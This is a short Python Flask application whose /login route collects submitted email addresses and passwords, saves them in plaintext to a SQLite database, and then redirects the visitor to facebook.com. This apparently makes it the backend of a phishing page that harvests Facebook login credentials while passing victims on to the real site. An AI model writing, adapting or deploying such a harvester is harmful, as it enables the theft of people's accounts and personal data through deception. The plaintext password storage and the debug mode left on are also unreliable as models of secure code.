from flask import Flask, request, send_from_directory, redirect
import sqlite3

# Initialize the Flask application
app = Flask(__name__)

# Create the USERS table if it does not exist
def init_db():
    with sqlite3.connect("data.db") as con:
        cur = con.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS USERS(email TEXT, pass TEXT)")
        con.commit()

init_db()

@app.route('/')
def serve_index():
    return send_from_directory('static', 'index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')

    # Insert the user data into the database
    with sqlite3.connect("data.db") as con:
        cur = con.cursor()
        cur.execute("INSERT INTO USERS (email, pass) VALUES (?, ?)", (email, password))
        con.commit()
    
    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(debug=True)
